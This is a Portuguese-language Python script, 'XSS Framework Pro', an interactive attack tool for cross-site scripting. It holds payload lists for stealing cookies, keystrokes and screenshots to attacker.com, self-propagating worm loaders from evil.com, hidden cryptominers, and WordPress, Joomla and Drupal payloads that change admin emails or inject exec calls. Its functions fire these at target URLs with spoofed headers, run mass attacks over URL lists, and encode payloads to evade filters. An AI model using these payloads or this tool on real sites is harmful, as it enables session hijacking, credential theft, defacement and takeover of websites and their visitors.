#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
XSS Framework Pro - Edição Avançada
Autor: [Seu Nome]
Versão: 3.0
Descrição: Framework completo para testes de vulnerabilidade XSS com recursos avançados
"""

import requests
import sys
import urllib.parse
import base64
from time import sleep
from colorama import Fore, Style, init
import random
import json

# Inicializa colorama
init()

# Banner atualizado
BANNER = f"""
{Fore.RED}
 ██╗  ██╗███████╗███████╗    █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
 ╚██╗██╔╝╚══███╔╝╚══███╔╝   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
  ╚███╔╝   ███╔╝   ███╔╝    ███████║   ██║      ██║   ███████║██║     █████╔╝ 
  ██╔██╗  ███╔╝   ███╔╝     ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
 ██╔╝ ██╗███████╗███████╗██╗██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
 ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
{Fore.YELLOW}
  XSS Framework Pro - Edição Avançada | {Fore.CYAN}Multi-Vetores | Evasão Avançada{Style.RESET_ALL}
"""

# Categorias de payloads avançados
PAYLOAD_CATEGORIES = {
    '1': {
        'name': 'Testes Básicos',
        'payloads': [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>"
        ]
    },
    '2': {
        'name': 'Sequestro de Sessão',
        'payloads': [
            "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
            "<img src=x onerror=\"fetch('https://attacker.com/log?data='+document.cookie)\">",
            "<script>new Image().src='http://attacker.com/collect?cookie='+encodeURI(document.cookie);</script>"
        ]
    },
    '3': {
        'name': 'Redirecionamento',
        'payloads': [
            "<script>window.location.href='https://phishing-site.com'</script>",
            "<meta http-equiv=\"refresh\" content=\"0; url=https://evil.com\">",
            "<iframe src=\"javascript:document.location.replace('https://malicious.site')\">"
        ]
    },
    '4': {
        'name': 'Keylogging',
        'payloads': [
            "<script>document.onkeypress=function(e){fetch('https://attacker.com/log?key='+e.key)}</script>",
            "<input onfocus=\"this.style='position:fixed;left:-999px'\" onblur=\"fetch('https://attacker.com/creds?val='+this.value)\">"
        ]
    },
    '5': {
        'name': 'Defacement',
        'payloads': [
            "<script>document.body.innerHTML='<h1 style=color:red>HACKED</h1>'</script>",
            "<style>*{background:#000 !important;color:#f00 !important}</style>"
        ]
    },
    '6': {
        'name': 'Polyglot Avançado',
        'payloads': [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(alert('XSS'))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//>\\x3e",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"'/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
        ]
    },
    '7': {
        'name': 'Evasão Avançada',
        'payloads': [
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
            "<img src=x oneonerrorrror=alert('XSS')>",
            "<iframe srcdoc='<script>alert(1)</script>'></iframe>"
        ]
    },
    '8': {
        'name': 'Worm XSS',
        'payloads': [
            "<script>if(!window.XSS_WORM){window.XSS_WORM=1;document.write('<script src=\\'https://evil.com/worm.js\\'><\\/script>')}</script>",
            "<script>setInterval(function(){document.write('<script src=\\'https://evil.com/worm.js\\'><\\/script>')},5000);</script>"
        ]
    },
    '9': {
        'name': 'Criptomineração',
        'payloads': [
            "<script src='https://coinhive.com/lib/miner.min.js' async></script><script>var miner=new CoinHive.Anonymous('YOUR_KEY');miner.start();</script>",
            "<iframe src='https://authedmine.com/media/miner.html?key=YOUR_KEY' style='width:0;height:0;border:0;border:none;'></iframe>"
        ]
    },
    '10': {
        'name': 'Screenlogging',
        'payloads': [
            "<script src='https://html2canvas.hertzen.com/dist/html2canvas.min.js'></script><script>html2canvas(document.body).then(canvas=>{fetch('https://attacker.com/steal',{method:'POST',body:canvas.toDataURL()});});</script>"
        ]
    },
    '11': {
        'name': 'Ataques CMS',
        'payloads': [
            "<script>jQuery.get(ajaxurl,{action:'update_option',option:'admin_email',new_value:'hacker@evil.com'})</script>",  # WordPress
            "<script>fetch('/administrator/index.php?option=com_users&task=user.apply&id=100',{method:'POST',body:'jform[email]=hacker@evil.com'})</script>"  # Joomla
        ]
    }
}

# Lista de user-agents para randomização
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
]

def print_banner():
    """Exibe o banner atualizado"""
    print(BANNER)

def show_main_menu():
    """Mostra o menu principal"""
    print(f"\n{Fore.CYAN}╔════════════════════════════════════════════╗")
    print(f"║       {Fore.YELLOW}XSS FRAMEWORK PRO - MENU PRINCIPAL{Fore.CYAN}       ║")
    print(f"╠════════════════════════════════════════════╣")
    print(f"║ {Fore.GREEN}1. {Fore.WHITE}Testar XSS em URL Específica{'':<15}{Fore.CYAN}║")
    print(f"║ {Fore.GREEN}2. {Fore.WHITE}Scan Automático de Sites{'':<18}{Fore.CYAN}║")
    print(f"║ {Fore.GREEN}3. {Fore.WHITE}Ataque em Massa (Lista de URLs){'':<10}{Fore.CYAN}║")
    print(f"║ {Fore.GREEN}4. {Fore.WHITE}Explorar CMS Específico{'':<18}{Fore.CYAN}║")
    print(f"║ {Fore.GREEN}5. {Fore.WHITE}Gerador de Payloads Customizados{'':<7}{Fore.CYAN}║")
    print(f"║ {Fore.GREEN}0. {Fore.WHITE}Sair{'':<33}{Fore.CYAN}║")
    print(f"╚════════════════════════════════════════════╝{Style.RESET_ALL}")

def show_payload_menu():
    """Mostra o menu de payloads"""
    print(f"\n{Fore.CYAN}╔════════════════════════════════════════════╗")
    print(f"║       {Fore.YELLOW}SELECIONE A CATEGORIA DE PAYLOAD{Fore.CYAN}       ║")
    print(f"╠════════════════════════════════════════════╣")
    for key in PAYLOAD_CATEGORIES:
        print(f"║ {Fore.GREEN}{key}. {Fore.WHITE}{PAYLOAD_CATEGORIES[key]['name']:<35}{Fore.CYAN}║")
    print(f"║ {Fore.GREEN}12.{Fore.WHITE} Custom Payload{'':<25}{Fore.CYAN}║")
    print(f"║ {Fore.GREEN}0. {Fore.WHITE}Voltar{'':<32}{Fore.CYAN}║")
    print(f"╚════════════════════════════════════════════╝{Style.RESET_ALL}")

def show_cms_menu():
    """Mostra o menu de CMS específicos"""
    print(f"\n{Fore.CYAN}╔════════════════════════════════════════════╗")
    print(f"║       {Fore.YELLOW}SELECIONE O CMS PARA EXPLORAÇÃO{Fore.CYAN}       ║")
    print(f"╠════════════════════════════════════════════╣")
    print(f"║ {Fore.GREEN}1. {Fore.WHITE}WordPress{'':<32}{Fore.CYAN}║")
    print(f"║ {Fore.GREEN}2. {Fore.WHITE}Joomla{'':<34}{Fore.CYAN}║")
    print(f"║ {Fore.GREEN}3. {Fore.WHITE}Drupal{'':<34}{Fore.CYAN}║")
    print(f"║ {Fore.GREEN}4. {Fore.WHITE}Magento{'':<33}{Fore.CYAN}║")
    print(f"║ {Fore.GREEN}0. {Fore.WHITE}Voltar{'':<32}{Fore.CYAN}║")
    print(f"╚════════════════════════════════════════════╝{Style.RESET_ALL}")

def get_random_user_agent():
    """Retorna um user-agent aleatório"""
    return random.choice(USER_AGENTS)

def test_xss(url, param, payload, method='GET', data=None):
    """Testa um payload XSS específico"""
    try:
        headers = {
            'User-Agent': get_random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'X-Forwarded-For': f'127.0.0.{random.randint(1, 255)}'
        }
        
        if method.upper() == 'GET':
            params = {param: payload}
            response = requests.get(url, params=params, headers=headers, timeout=15)
        else:
            data = {param: payload} if data is None else data
            response = requests.post(url, data=data, headers=headers, timeout=15)
        
        if payload in response.text:
            return True, response.url
        return False, response.url
        
    except Exception as e:
        print(f"{Fore.RED}[!] Erro: {e}{Style.RESET_ALL}")
        return False, None

def scan_site_for_parameters(url):
    """Tenta identificar parâmetros na URL"""
    print(f"\n{Fore.YELLOW}[*] Analisando {url} para encontrar parâmetros...{Style.RESET_ALL}")
    
    try:
        response = requests.get(url, headers={'User-Agent': get_random_user_agent()}, timeout=10)
        
        # Simples análise de parâmetros - em um scanner real seria mais sofisticado
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if params:
            print(f"{Fore.GREEN}[+] Parâmetros encontrados: {', '.join(params.keys())}{Style.RESET_ALL}")
            return list(params.keys())
        else:
            print(f"{Fore.YELLOW}[-] Nenhum parâmetro encontrado na URL{Style.RESET_ALL}")
            return None
            
    except Exception as e:
        print(f"{Fore.RED}[!] Erro ao escanear: {e}{Style.RESET_ALL}")
        return None

def mass_attack(url_list_file, param):
    """Executa ataque em massa a partir de uma lista de URLs"""
    try:
        with open(url_list_file, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
            
        print(f"\n{Fore.YELLOW}[*] Iniciando ataque em massa a {len(urls)} URLs{Style.RESET_ALL}")
        
        for url in urls:
            print(f"\n{Fore.CYAN}[*] Testando: {url}{Style.RESET_ALL}")
            category = PAYLOAD_CATEGORIES['1']  # Usa payloads básicos por padrão
            
            for payload in category['payloads']:
                vulnerable, target_url = test_xss(url, param, payload)
                if vulnerable:
                    print(f"{Fore.GREEN}[+] VULNERÁVEL! Payload: {payload}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}[+] URL: {target_url}{Style.RESET_ALL}")
                    break
                sleep(0.5)
                
    except Exception as e:
        print(f"{Fore.RED}[!] Erro no ataque em massa: {e}{Style.RESET_ALL}")

def generate_custom_payload():
    """Gera payloads customizados com encoding"""
    print(f"\n{Fore.CYAN}╔════════════════════════════════════════════╗")
    print(f"║       {Fore.YELLOW}GERADOR DE PAYLOADS CUSTOMIZADOS{Fore.CYAN}       ║")
    print(f"╠════════════════════════════════════════════╣")
    print(f"║ {Fore.GREEN}1. {Fore.WHITE}Codificar em Unicode{'':<24}{Fore.CYAN}║")
    print(f"║ {Fore.GREEN}2. {Fore.WHITE}Codificar em Hex{'':<27}{Fore.CYAN}║")
    print(f"║ {Fore.GREEN}3. {Fore.WHITE}Codificar em Base64{'':<23}{Fore.CYAN}║")
    print(f"║ {Fore.GREEN}4. {Fore.WHITE}Fragmentar Payload{'':<24}{Fore.CYAN}║")
    print(f"║ {Fore.GREEN}0. {Fore.WHITE}Voltar{'':<32}{Fore.CYAN}║")
    print(f"╚════════════════════════════════════════════╝{Style.RESET_ALL}")
    
    choice = input(f"\n{Fore.YELLOW}[?] Selecione uma opção: {Style.RESET_ALL}")
    
    if choice == '0':
        return None
    
    payload = input(f"{Fore.CYAN}[?] Digite o payload base: {Style.RESET_ALL}")
    
    if choice == '1':
        # Codificação Unicode
        encoded = ''.join([f'\\u{ord(c):04x}' for c in payload])
        return f"<script>eval('{encoded}')</script>"
    
    elif choice == '2':
        # Codificação Hex
        encoded = ''.join([f'\\x{ord(c):02x}' for c in payload])
        return f"<script>eval('{encoded}')</script>"
    
    elif choice == '3':
        # Codificação Base64
        encoded = base64.b64encode(payload.encode()).decode()
        return f"<script>eval(atob('{encoded}'))</script>"
    
    elif choice == '4':
        # Fragmentação de payload
        parts = [payload[i:i+10] for i in range(0, len(payload), 10)]
        reconstructed = '+'.join([f"'{part}'" for part in parts])
        return f"<script>eval({reconstructed})</script>"
    
    else:
        print(f"{Fore.RED}[!] Opção inválida{Style.RESET_ALL}")
        return None

def exploit_cms(cms_type, url):
    """Explora vulnerabilidades específicas de CMS"""
    print(f"\n{Fore.YELLOW}[*] Explorando {cms_type} em {url}{Style.RESET_ALL}")
    
    if cms_type.lower() == 'wordpress':
        payloads = [
            "<script>jQuery.get(ajaxurl, {action: 'update_option', option: 'admin_email', new_value: 'hacker@evil.com'})</script>",
            "<img src=x onerror=\"fetch('/wp-admin/admin-ajax.php?action=parse-media-shortcode&shortcode=[video src=1 onerror=alert(1)]')\">"
        ]
    elif cms_type.lower() == 'joomla':
        payloads = [
            "<script>fetch('/administrator/index.php?option=com_users&task=user.apply&id=100',{method:'POST',body:'jform[email]=hacker@evil.com'})</script>",
            "<img src=x onerror=\"fetch('/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x3a,concat(1,user()),1)')\">"
        ]
    elif cms_type.lower() == 'drupal':
        payloads = [
            "<script>fetch('/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', {method: 'POST', body: 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=echo hacked'})</script>"
        ]
    else:
        print(f"{Fore.RED}[!] CMS não suportado{Style.RESET_ALL}")
        return
    
    # Tenta encontrar parâmetros comuns
    params = ['q', 'search', 's', 'id', 'page'] if cms_type.lower() == 'wordpress' else ['option', 'view', 'id']
    
    for param in params:
        print(f"\n{Fore.CYAN}[*] Testando parâmetro: {param}{Style.RESET_ALL}")
        
        for payload in payloads:
            vulnerable, target_url = test_xss(url, param, payload)
            if vulnerable:
                print(f"{Fore.GREEN}[+] VULNERÁVEL! Payload: {payload}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}[+] URL: {target_url}{Style.RESET_ALL}")
                return
    
    print(f"{Fore.RED}[-] Nenhuma vulnerabilidade encontrada{Style.RESET_ALL}")

def main():
    print_banner()
    
    while True:
        show_main_menu()
        choice = input(f"\n{Fore.YELLOW}[?] Selecione uma opção (0-5): {Style.RESET_ALL}")
        
        if choice == '0':
            print(f"{Fore.YELLOW}[*] Saindo...{Style.RESET_ALL}")
            break
            
        elif choice == '1':
            if len(sys.argv) < 3:
                url = input(f"{Fore.CYAN}[?] Digite a URL alvo (ex: http://site.com/vulneravel.php): {Style.RESET_ALL}")
                param = input(f"{Fore.CYAN}[?] Digite o parâmetro a testar (ex: busca): {Style.RESET_ALL}")
            else:
                url = sys.argv[1]
                param = sys.argv[2]
            
            while True:
                show_payload_menu()
                payload_choice = input(f"\n{Fore.YELLOW}[?] Selecione uma categoria de payload (0-12): {Style.RESET_ALL}")
                
                if payload_choice == '0':
                    break
                    
                elif payload_choice == '12':
                    custom_payload = input(f"{Fore.CYAN}[?] Digite seu payload customizado: {Style.RESET_ALL}")
                    vulnerable, target_url = test_xss(url, param, custom_payload)
                    if vulnerable:
                        print(f"{Fore.GREEN}[+] VULNERÁVEL! Payload injetado com sucesso em: {target_url}{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.RED}[-] Payload não refletido{Style.RESET_ALL}")
                
                elif payload_choice in PAYLOAD_CATEGORIES:
                    category = PAYLOAD_CATEGORIES[payload_choice]
                    print(f"\n{Fore.CYAN}=== TESTANDO CATEGORIA: {category['name']} ==={Style.RESET_ALL}")
                    
                    for i, payload in enumerate(category['payloads'], 1):
                        print(f"{Fore.WHITE}[*] Testando payload {i}/{len(category['payloads'])}...{Style.RESET_ALL}", end='\r')
                        vulnerable, target_url = test_xss(url, param, payload)
                        
                        if vulnerable:
                            print(f"\n{Fore.GREEN}[+] SUCESSO! {Fore.YELLOW}Payload: {payload}")
                            print(f"{Fore.GREEN}[+] URL: {target_url}{Style.RESET_ALL}")
                        sleep(0.2)
                        
                    print(f"\n{Fore.YELLOW}[*] Teste da categoria {category['name']} concluído!{Style.RESET_ALL}")
                
                else:
                    print(f"{Fore.RED}[!] Opção inválida!{Style.RESET_ALL}")
            
        elif choice == '2':
            url = input(f"{Fore.CYAN}[?] Digite a URL para scan (ex: http://site.com): {Style.RESET_ALL}")
            params = scan_site_for_parameters(url)
            
            if params:
                param = params[0]  # Usa o primeiro parâmetro encontrado
                category = PAYLOAD_CATEGORIES['1']  # Usa payloads básicos para scan
                
                for payload in category['payloads']:
                    vulnerable, target_url = test_xss(url, param, payload)
                    if vulnerable:
                        print(f"{Fore.GREEN}[+] VULNERÁVEL! Payload: {payload}{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}[+] URL: {target_url}{Style.RESET_ALL}")
                        break
                    sleep(0.5)
            
        elif choice == '3':
            url_list = input(f"{Fore.CYAN}[?] Digite o caminho do arquivo com a lista de URLs: {Style.RESET_ALL}")
            param = input(f"{Fore.CYAN}[?] Digite o parâmetro a testar (ex: busca): {Style.RESET_ALL}")
            mass_attack(url_list, param)
            
        elif choice == '4':
            show_cms_menu()
            cms_choice = input(f"\n{Fore.YELLOW}[?] Selecione o CMS (0-4): {Style.RESET_ALL}")
            
            if cms_choice == '1':
                cms_type = 'WordPress'
            elif cms_choice == '2':
                cms_type = 'Joomla'
            elif cms_choice == '3':
                cms_type = 'Drupal'
            elif cms_choice == '4':
                cms_type = 'Magento'
            else:
                continue
                
            url = input(f"{Fore.CYAN}[?] Digite a URL do {cms_type} (ex: http://site.com): {Style.RESET_ALL}")
            exploit_cms(cms_type, url)
            
        elif choice == '5':
            custom_payload = generate_custom_payload()
            if custom_payload:
                print(f"\n{Fore.GREEN}[+] Payload gerado: {custom_payload}{Style.RESET_ALL}")
            
        else:
            print(f"{Fore.RED}[!] Opção inválida!{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
